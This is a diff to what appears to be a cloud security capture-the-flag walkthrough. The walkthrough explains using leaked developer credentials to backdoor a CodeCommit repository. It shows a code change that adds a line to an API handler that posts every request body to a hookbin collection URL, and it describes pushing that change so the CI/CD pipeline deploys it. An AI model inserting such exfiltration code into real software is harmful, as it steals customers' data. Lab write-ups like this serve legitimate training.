@@ -91,7 +91,7 @@ index 7130465..4beaa61 100644
 
 These credentials you found belong to the user `developer`, who has pull and push access to this repository. Use this access to backdoor the application and steal the sensitive data that customers are sending to the API!
 
-- For instance, add a piece of code to the checked out repo that sends the secret data to an attacker-controlled server:
+- For instance, add a piece of code to the checked out repo that sends the secret data to an attacker-controlled server. You can use something similar to what is shown below, if you do, you'll want to first generate your own hookbin link at https://hookbin.com/.
 
 ```diff
 diff --git a/app.py b/app.py
@@ -102,10 +102,12 @@ index 10e7da5..e17a2ba 100644
 
  def handle(event):
    body = event.get('body')
-+  import requests; requests.post("https://hookbin.com/kx9QGWGQMoUBjzggjga9", data=body)
++  import requests; requests.post("https://hookbin.com/kx...", data=body)
    if body is None:
      return 400, "missing body"
 ```
+
+
 
 - Ensure the credentials you found above are set in your environment or a profile.
 
@@ -127,5 +129,4 @@ $ aws codecommit put-file --repository-name backend-api --branch-name master --f
 ```
 
 
-Note that the application is automatically being built by a CI/CD pipeline in CodePipeline. After a few minutes, your backdoored application will be deployed, and your attacker-controlled server will receive the flag!
-
+Note that the application is automatically being built by a CI/CD pipeline in CodePipeline. It may take a bit to deploy, give it some time and you should see the flag show up on hookbin if you used the method above (you may need to refresh the page though).
